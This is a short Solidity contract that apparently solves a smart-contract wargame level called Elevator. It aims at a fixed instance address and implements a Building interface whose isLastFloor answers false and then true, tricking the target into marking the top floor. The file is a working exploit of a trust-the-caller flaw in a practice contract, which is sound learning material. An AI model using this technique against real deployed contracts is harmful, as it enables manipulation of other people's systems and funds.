// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./interfaces/12_IElevator.sol";

address constant INSTANCE = 0x1118AA9b45b103C914D5cc253C37832D78C4581a;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract ElevatorSolution is Building {
    IElevator instance = IElevator(INSTANCE);
    bool isTop;

    function solve() external {
        instance.goTo(1);
    }

    function isLastFloor(uint) external returns (bool) {
        if (!isTop) {
            isTop = true;
            return false;
        }
        return true;
    }
}